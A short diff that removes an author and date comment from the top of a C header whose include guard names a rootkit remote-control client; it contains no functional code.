@@ -1,7 +1,3 @@
-//
-// Created by idan on 1/21/24.
-//
-
 #ifndef ROOTKIT_REMOTE_CONTROL_CLIENT_H
 #define ROOTKIT_REMOTE_CONTROL_CLIENT_H
 
